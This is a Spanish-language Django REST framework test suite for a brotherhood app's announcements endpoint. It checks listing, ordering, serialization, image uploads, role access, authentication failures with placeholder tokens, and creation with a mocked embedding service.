from datetime import timedelta
import os
import threading
import time
import requests

from django.test import TestCase, override_settings
from rest_framework.test import APIClient
from rest_framework import status
from django.urls import reverse
from django.utils import timezone
from django.db import DatabaseError, IntegrityError, connection
from unittest.mock import patch, MagicMock
from django.core.files.uploadedfile import SimpleUploadedFile
from rest_framework_simplejwt.tokens import RefreshToken

from api.models import CuerpoPertenencia, Hermano, AreaInteres, Comunicado, HermanoCuerpo
from api.servicios.comunicado.gemini_service import generar_y_guardar_embedding_async


class TestComunicadoListCreateView(TestCase):
    
    def setUp(self):
        """
        Configuración inicial para las pruebas de la vista ComunicadoListCreateView.
        Se preparan los datos básicos: usuario autenticado, áreas de interés y 
        la URL de acceso al endpoint.
        """
        self.client = APIClient()

        self.usuario = Hermano.objects.create_user(
            dni='12345678A',
            username='12345678A',
            nombre='Juan',
            primer_apellido='Pérez',
            segundo_apellido='García',
            email='juan@example.com',
            telefono='600123456',
            estado_civil='SOLTERO',
            password='password123'
        )

        self.area_caridad = AreaInteres.objects.create(nombre_area='CARIDAD')
        self.area_juventud = AreaInteres.objects.create(nombre_area='JUVENTUD')

        self.client.force_authenticate(user=self.usuario)

        self.url = reverse('lista-crear-comunicados')

        self.valid_payload = {
            "titulo": "Nuevo comunicado de prueba",
            "contenido": "<p>Contenido importante</p>",
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_caridad.id, self.area_juventud.id]
        }



    def test_get_comunicados_usuario_autenticado_retorna_200(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario correctamente autenticado en el sistema.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar un código de estado HTTP 200 OK.
        """
        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)



    def test_get_comunicados_vacio_cuando_no_existen_registros(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario correctamente autenticado y una base de datos sin comunicados.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar un código 200 OK y una lista vacía en el cuerpo.
        """
        Comunicado.objects.all().delete()

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(len(response.data), 0)
        self.assertEqual(response.data, [])



    def test_get_comunicado_existente_retorna_datos_correctos(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario autenticado y un comunicado existente en la base de datos.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar un código 200 OK y el comunicado correctamente serializado.
        """
        comunicado = Comunicado.objects.create(
            titulo="Comunicado de Hermandad",
            contenido="<p>Próximo cabildo general.</p>",
            tipo_comunicacion="INFORMATIVO",
            autor=self.usuario
        )
        comunicado.areas_interes.add(self.area_caridad)

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(len(response.data), 1)

        datos_comunicado = response.data[0]
        self.assertEqual(datos_comunicado['titulo'], "Comunicado de Hermandad")
        self.assertEqual(datos_comunicado['tipo_comunicacion'], "INFORMATIVO")

        self.assertIn(str(self.area_caridad), datos_comunicado['areas_interes'])



    def test_get_comunicados_multiples_retorna_lista_ordenada(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario autenticado y varios comunicados en la base de datos.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar un código 200 OK y la lista con todos los registros.
        """
        Comunicado.objects.create(
            titulo="Primer Comunicado",
            contenido="Contenido 1",
            tipo_comunicacion="INFORMATIVO",
            autor=self.usuario
        )

        time.sleep(0.01) 
        
        Comunicado.objects.create(
            titulo="Segundo Comunicado",
            contenido="Contenido 2",
            tipo_comunicacion="URGENTE",
            autor=self.usuario
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)

        self.assertEqual(len(response.data), 2)

        self.assertEqual(response.data[0]['titulo'], "Segundo Comunicado")
        self.assertEqual(response.data[1]['titulo'], "Primer Comunicado")



    def test_get_comunicados_orden_descendente_por_fecha_emision(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario autenticado y varios comunicados con distintas fechas de emisión.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar los comunicados ordenados de más reciente a más antiguo.
        """

        comunicado_antiguo = Comunicado.objects.create(
            titulo="Comunicado Antiguo",
            contenido="Contenido",
            tipo_comunicacion="INFORMATIVO",
            autor=self.usuario
        )

        Comunicado.objects.filter(id=comunicado_antiguo.id).update(
            fecha_emision=timezone.now() - timedelta(days=1)
        )

        comunicado_reciente = Comunicado.objects.create(
            titulo="Comunicado Reciente",
            contenido="Contenido",
            tipo_comunicacion="URGENTE",
            autor=self.usuario
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(len(response.data), 2)

        self.assertEqual(response.data[0]['titulo'], "Comunicado Reciente")
        self.assertEqual(response.data[1]['titulo'], "Comunicado Antiguo")



    def test_get_comunicados_verifica_campos_del_serializador(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario autenticado y un comunicado registrado en base de datos.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar el objeto serializado con los campos exactos 
            (titulo, contenido, fecha_emision, tipo_display, autor_nombre) y sus valores correctos.
        """
        comunicado = Comunicado.objects.create(
            titulo="Aviso de Priostía",
            contenido="<p>Limpieza de plata este sábado.</p>",
            tipo_comunicacion="INFORMATIVO",
            autor=self.usuario
        )
        comunicado.areas_interes.add(self.area_caridad)

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertTrue(len(response.data) > 0)

        datos = response.data[0]

        self.assertIn('titulo', datos)
        self.assertEqual(datos['titulo'], "Aviso de Priostía")

        self.assertIn('contenido', datos)
        self.assertEqual(datos['contenido'], "<p>Limpieza de plata este sábado.</p>")

        self.assertIn('fecha_emision', datos)
        self.assertIsInstance(datos['fecha_emision'], str)

        self.assertIn('tipo_display', datos)
        self.assertEqual(datos['tipo_display'], comunicado.get_tipo_comunicacion_display())

        self.assertIn('autor_nombre', datos)
        self.assertEqual(datos['autor_nombre'], "Juan Pérez")



    def test_get_comunicados_areas_interes_es_una_lista(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario autenticado y un comunicado asociado a múltiples áreas.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: El campo 'areas_interes' en la respuesta debe ser de tipo lista.
        """
        comunicado = Comunicado.objects.create(
            titulo="Comunicado Multiarea",
            contenido="Contenido",
            tipo_comunicacion="GENERAL",
            autor=self.usuario
        )
        comunicado.areas_interes.add(self.area_caridad, self.area_juventud)

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        datos = response.data[0]

        self.assertIsInstance(datos['areas_interes'], list)

        self.assertEqual(len(datos['areas_interes']), 2)

        self.assertIn("Caridad", datos['areas_interes'])
        self.assertIn("Juventud", datos['areas_interes'])



    def test_get_comunicado_autor_nombre_esta_bien_concatenado(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario con nombre 'Juan' y primer apellido 'Pérez'.
        When: Se consulta un comunicado emitido por dicho usuario.
        Then: El campo 'autor_nombre' debe devolver la cadena 'Juan Pérez'.
        """
        Comunicado.objects.create(
            titulo="Test de Autor",
            contenido="Contenido",
            tipo_comunicacion="GENERAL",
            autor=self.usuario
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        datos_comunicado = response.data[0]

        nombre_esperado = f"{self.usuario.nombre} {self.usuario.primer_apellido}"
        
        self.assertIn('autor_nombre', datos_comunicado)
        self.assertEqual(datos_comunicado['autor_nombre'], nombre_esperado)
        self.assertEqual(datos_comunicado['autor_nombre'], "Juan Pérez")



    def test_get_comunicado_con_imagen_devuelve_url_correcta(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un comunicado que tiene una imagen de portada asignada.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: El campo 'imagen_portada' debe contener la URL del archivo subido.
        """
        imagen_mock = (
            b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x00\x00\x00\x21\xf9\x04'
            b'\x01\x0a\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02'
            b'\x02\x4c\x01\x00\x3b'
        )
        foto = SimpleUploadedFile(
            name='test_portada.gif', 
            content=imagen_mock, 
            content_type='image/gif'
        )

        Comunicado.objects.create(
            titulo="Comunicado con Foto",
            contenido="Cuerpo del mensaje",
            tipo_comunicacion="EVENTOS",
            autor=self.usuario,
            imagen_portada=foto
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        datos = response.data[0]

        self.assertIsNotNone(datos['imagen_portada'])
        self.assertIn('test_portada', datos['imagen_portada'])
        self.assertTrue(datos['imagen_portada'].startswith('http'))



    def test_get_comunicado_sin_imagen_devuelve_null(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un comunicado registrado sin ninguna imagen de portada (null).
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar el comunicado con el campo 'imagen_portada' como null o vacío.
        """
        Comunicado.objects.create(
            titulo="Comunicado solo texto",
            contenido="Este comunicado no tiene imagen.",
            tipo_comunicacion="GENERAL",
            autor=self.usuario
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        datos = response.data[0]

        self.assertIn('imagen_portada', datos)
        self.assertNil = self.assertIsNone(datos['imagen_portada'])



    def test_get_comunicados_usuario_admin_puede_listar(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario con el rol de administrador (esAdmin=True).
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe permitir el acceso y retornar un código 200 OK.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        Comunicado.objects.create(
            titulo="Comunicado para Admins",
            contenido="Contenido",
            tipo_comunicacion="SECRETARIA",
            autor=self.usuario
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(len(response.data), 1)
        self.assertEqual(response.data[0]['titulo'], "Comunicado para Admins")



    def test_get_comunicados_usuario_hermano_normal_puede_listar(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario hermano estándar (esAdmin=False).
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe permitir el acceso y retornar un código 200 OK.
        """
        self.usuario.esAdmin = False
        self.usuario.save()

        Comunicado.objects.create(
            titulo="Comunicado para Hermanos",
            contenido="Información general de la Hermandad",
            tipo_comunicacion="INFORMATIVO",
            autor=self.usuario
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertTrue(len(response.data) >= 1)
        self.assertEqual(response.data[0]['titulo'], "Comunicado para Hermanos")



    def test_get_comunicados_usuario_junta_gobierno_puede_listar(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario que pertenece al cuerpo de 'Junta de Gobierno'.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe permitir el acceso y retornar un código 200 OK.
        """
        cuerpo_junta, _ = CuerpoPertenencia.objects.get_or_create(
            nombre_cuerpo='JUNTA_GOBIERNO'
        )

        HermanoCuerpo.objects.create(
            hermano=self.usuario,
            cuerpo=cuerpo_junta,
            anio_ingreso=2024
        )

        Comunicado.objects.create(
            titulo="Acuerdo de Junta",
            contenido="Detalles del acta de la última sesión.",
            tipo_comunicacion="SECRETARIA",
            autor=self.usuario
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(len(response.data), 1)
        self.assertEqual(response.data[0]['titulo'], "Acuerdo de Junta")



    def test_get_comunicados_con_embedding_null_retorna_correctamente(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario autenticado y un comunicado cuyo campo 'embedding' es NULL.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar el comunicado correctamente (200 OK) y el campo debe ser nulo.
        """
        Comunicado.objects.create(
            titulo="Comunicado sin procesamiento IA",
            contenido="Este contenido aún no ha sido vectorizado.",
            tipo_comunicacion="INFORMATIVO",
            autor=self.usuario,
            embedding=None
        )

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        datos_comunicado = response.data[0]

        self.assertEqual(datos_comunicado['titulo'], "Comunicado sin procesamiento IA")

        if 'embedding' in datos_comunicado:
            self.assertIsNone(datos_comunicado['embedding'])



    def test_get_comunicados_con_multiples_areas_interes_serializa_bien(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un usuario autenticado y un comunicado dirigido a varias áreas de interés.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar el comunicado con todos los nombres de las áreas en una lista.
        """
        comunicado = Comunicado.objects.create(
            titulo="Comunicado Multiarea",
            contenido="Información para Caridad y Juventud",
            tipo_comunicacion="GENERAL",
            autor=self.usuario
        )

        comunicado.areas_interes.add(self.area_caridad, self.area_juventud)

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        datos_areas = response.data[0]['areas_interes']

        self.assertIsInstance(datos_areas, list)
        self.assertEqual(len(datos_areas), 2)

        self.assertIn("Caridad", datos_areas)
        self.assertIn("Juventud", datos_areas)



    def test_get_comunicados_usuario_no_autenticado_retorna_401(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un cliente HTTP sin credenciales (usuario no autenticado).
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe denegar el acceso y retornar un código HTTP 401 Unauthorized.
        """
        self.client.force_authenticate(user=None)

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)



    def test_get_comunicados_token_jwt_expirado_retorna_401(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un cliente HTTP que envía un token JWT caducado en sus cabeceras.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: El middleware de autenticación debe rechazar el token y retornar HTTP 401 Unauthorized.
        """
        self.client.force_authenticate(user=None)

        token_expirado = (
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            "eyJleHAiOjE1MTYyMzkwMjIsImlhdCI6MTUxNjIzOTAyMn0." 
            "firma_invalida_o_expirada_simulada"
        )

        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token_expirado}')

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)



    def test_get_comunicados_token_invalido_retorna_401(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un cliente HTTP que envía un token JWT malformado o inválido.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe denegar el acceso y retornar un código HTTP 401 Unauthorized.
        """
        self.client.force_authenticate(user=None)

        token_corrupto = "esto-no-es-un-token-valido-12345"

        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token_corrupto}')

        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)



    def test_get_comunicados_cabecera_auth_mal_formada_retorna_401(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un cliente HTTP que envía una cabecera Authorization con formato incorrecto.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar un código HTTP 401 Unauthorized por malformación de cabecera.
        """
        self.client.force_authenticate(user=None)

        self.client.credentials(HTTP_AUTHORIZATION='token_sin_prefijo_invalido')
        response_a = self.client.get(self.url)
        self.assertEqual(response_a.status_code, status.HTTP_401_UNAUTHORIZED)

        self.client.credentials(HTTP_AUTHORIZATION='Bearer   ')
        response_b = self.client.get(self.url)
        self.assertEqual(response_b.status_code, status.HTTP_401_UNAUTHORIZED)



    def test_get_comunicados_usuario_eliminado_con_token_valido_retorna_401(self):
        """
        Test: Casos de prueba - GET /comunicados/

        Given: Un token JWT válido perteneciente a un usuario que ha sido eliminado de la BD.
        When: Se realiza una petición GET al endpoint de comunicados.
        Then: La vista debe retornar un código HTTP 401 Unauthorized al no encontrar al usuario.
        """
        self.client.force_authenticate(user=None)

        usuario_efimero = Hermano.objects.create_user(
            dni='99999999Z',
            username='99999999Z',
            email='efimero@example.com',
            password='password123',
            nombre='Efimero',
            primer_apellido='Test',
            segundo_apellido='Test',
            telefono='666777888',
            estado_civil='SOLTERO'
        )

        refresh = RefreshToken.for_user(usuario_efimero)
        token_real = str(refresh.access_token)

        usuario_efimero.delete()

        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token_real}')
        response = self.client.get(self.url)

        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_admin_valido_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con rol admin y un payload con todos los campos requeridos.
        When: Se realiza una petición POST al endpoint de comunicados.
        Then: La vista debe crear el registro y retornar un código HTTP 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Convocatoria de Cabildo",
            "contenido": "Se convoca a todos los hermanos el próximo viernes.",
            "tipo_comunicacion": "SECRETARIA",
            "areas_interes": [self.area_caridad.id, self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        self.assertEqual(Comunicado.objects.count(), 1)
        nuevo_comunicado = Comunicado.objects.first()
        
        self.assertEqual(nuevo_comunicado.titulo, payload["titulo"])
        self.assertEqual(nuevo_comunicado.autor, self.usuario)
        self.assertEqual(nuevo_comunicado.areas_interes.count(), 2)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_junta_gobierno_valido_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario que pertenece al cuerpo de 'Junta de Gobierno'.
        When: Se realiza una petición POST con un payload válido.
        Then: La vista debe crear el comunicado y retornar un código HTTP 201 Created.
        """
        cuerpo_junta, _ = CuerpoPertenencia.objects.get_or_create(
            nombre_cuerpo='JUNTA_GOBIERNO'
        )
        HermanoCuerpo.objects.create(
            hermano=self.usuario,
            cuerpo=cuerpo_junta,
            anio_ingreso=2024
        )

        payload = {
            "titulo": "Instrucciones para el Reparto de Papeletas",
            "contenido": "Se detallan los turnos para la próxima semana.",
            "tipo_comunicacion": "SECRETARIA",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertEqual(comunicado.autor, self.usuario)
        self.assertEqual(comunicado.get_tipo_comunicacion_display(), "Secretaría")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_una_sola_area_interes_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con permisos y un payload válido con una única área de interés.
        When: Se realiza una petición POST al endpoint de comunicados.
        Then: La vista debe crear el comunicado correctamente y retornar HTTP 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Reunión de Caridad",
            "contenido": "Se convoca a los miembros para organizar el reparto de alimentos.",
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_caridad.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado_creado = Comunicado.objects.get(titulo=payload["titulo"])

        self.assertEqual(comunicado_creado.areas_interes.count(), 1)
        self.assertEqual(comunicado_creado.areas_interes.first(), self.area_caridad)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_varias_areas_interes_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con permisos y un payload con múltiples IDs en áreas de interés.
        When: Se realiza una petición POST al endpoint de comunicados.
        Then: La vista debe crear el comunicado vinculando todas las áreas y retornar 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Convivencia Coro y Grupo Joven",
            "contenido": "Evento conjunto para organizar el próximo certamen benéfico.",
            "tipo_comunicacion": "EVENTOS",
            "areas_interes": [self.area_juventud.id, self.area_caridad.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        areas_asociadas_ids = list(comunicado.areas_interes.values_list('id', flat=True))
        
        self.assertEqual(len(areas_asociadas_ids), 2)
        self.assertIn(self.area_juventud.id, areas_asociadas_ids)
        self.assertIn(self.area_caridad.id, areas_asociadas_ids)


    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_con_imagen_portada_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con permisos y un payload válido que incluye una imagen de portada.
        When: Se realiza una petición POST (multipart/form-data) al endpoint.
        Then: La vista debe crear el comunicado, guardar la imagen y retornar 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        imagen_mock = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01'
            b'\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00'
            b'\x00\x0cIDATx\x9cc\xf8\xff\xff?\x00\x05\xfe\x02\xfe'
            b'\r\xef\xf6\x7f\x00\x00\x00\x00IEND\xaeB`\x82'
        )
        foto = SimpleUploadedFile(
            name='portada_test.png',
            content=imagen_mock, 
            content_type='image/png'
        )

        payload = {
            "titulo": "Noticia con Foto Notoria",
            "contenido": "Cuerpo del mensaje con imagen adjunta.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id],
            "imagen_portada": foto
        }

        response = self.client.post(self.url, data=payload)

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertTrue(comunicado.imagen_portada)
        self.assertIn('portada_test', comunicado.imagen_portada.name)

        self.assertIn('imagen_portada', response.data)
        self.assertIsNotNone(response.data['imagen_portada'])


    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_sin_imagen_portada_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con permisos y un payload válido que NO incluye imagen de portada.
        When: Se realiza una petición POST al endpoint de comunicados.
        Then: La vista debe crear el comunicado con la imagen en null y retornar 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Comunicado Solo Texto",
            "contenido": "Este mensaje no requiere apoyo visual para ser relevante.",
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])

        self.assertFalse(comunicado.imagen_portada)
        self.assertEqual(comunicado.imagen_portada.name, '')

        self.assertIsNone(response.data['imagen_portada'])



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_tipo_comunicacion_valido_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con permisos y un payload con un 'tipo_comunicacion' válido.
        When: Se realiza una petición POST al endpoint de comunicados.
        Then: La vista debe crear el comunicado correctamente con el tipo especificado y retornar 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Solemne Quinario",
            "contenido": "Comienzan los cultos en honor a nuestros titulares.",
            "tipo_comunicacion": "CULTOS",
            "areas_interes": [self.area_caridad.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertEqual(comunicado.tipo_comunicacion, "CULTOS")

        self.assertEqual(response.data['tipo_comunicacion'], "CULTOS")
        self.assertEqual(response.data['tipo_display'], "Cultos")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_contenido_largo_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con permisos y un payload con un contenido extenso (más de 1000 caracteres).
        When: Se realiza una petición POST al endpoint de comunicados.
        Then: La vista debe procesar y guardar el texto completo correctamente y retornar 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        contenido_extenso = ("Cuerpo del comunicado con información detallada. " * 30).strip()
        
        payload = {
            "titulo": "Comunicado Detallado de Formación",
            "contenido": contenido_extenso,
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertEqual(comunicado.contenido, contenido_extenso)
        self.assertEqual(len(comunicado.contenido), len(contenido_extenso))

        self.assertEqual(response.data['contenido'], contenido_extenso)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_asigna_autor_automaticamente_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario autenticado (Admin) que envía un payload sin el campo 'autor'.
        When: Se realiza una petición POST al endpoint.
        Then: El sistema debe asignar al usuario de la petición como autor del comunicado.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Test de Autoría Automática",
            "contenido": "Verificando que el sistema sabe quién escribe esto.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])

        self.assertEqual(comunicado.autor, self.usuario)
        self.assertEqual(comunicado.autor.id, self.usuario.id)

        self.assertIn('autor_nombre', response.data)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_devuelve_payload_serializado_correctamente(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin y un payload completo.
        When: Se realiza una petición POST exitosa.
        Then: La respuesta debe contener la estructura exacta definida en el serializador de listado.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Estructura de Respuesta Correcta",
            "contenido": "Validando que el JSON de vuelta es el esperado.",
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_caridad.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        claves_esperadas = [
            'id', 'titulo', 'contenido', 'fecha_emision', 
            'imagen_portada', 'tipo_comunicacion', 'tipo_display', 
            'autor_nombre', 'areas_interes'
        ]
        for clave in claves_esperadas:
            self.assertIn(clave, response.data, f"La clave '{clave}' falta en la respuesta")

        self.assertEqual(response.data['titulo'], payload['titulo'])
        self.assertEqual(response.data['tipo_display'], "Informativo")

        nombre_esperado = f"{self.usuario.nombre} {self.usuario.primer_apellido}".strip()
        self.assertEqual(response.data['autor_nombre'], nombre_esperado)
        self.assertIsInstance(response.data['areas_interes'], list)
        self.assertEqual(response.data['areas_interes'][0], str(self.area_caridad))



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_genera_fecha_emision_automatica(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con permisos que envía un comunicado.
        When: Se realiza una petición POST exitosa.
        Then: El sistema debe asignar automáticamente la fecha de emisión actual.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Noticia con Sello de Tiempo",
            "contenido": "Verificando la generación automática de fecha.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        tiempo_antes_peticion = timezone.now()

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])

        self.assertIsNotNone(comunicado.fecha_emision)

        self.assertAlmostEqual(
            comunicado.fecha_emision, 
            tiempo_antes_peticion, 
            delta=timedelta(seconds=5)
        )

        self.assertIn('fecha_emision', response.data)
        self.assertIsNotNone(response.data['fecha_emision'])



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_ejecuta_generacion_embedding_async(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin y un payload válido.
        When: Se realiza una petición POST para crear un comunicado.
        Then: El servicio debe disparar la función de generación de embeddings con el ID del nuevo registro.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Prueba de Integración de IA",
            "contenido": "Asegurando que el vector se genera en segundo plano.",
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado_creado = Comunicado.objects.get(titulo=payload["titulo"])

        mock_generar_embedding.assert_called_once()

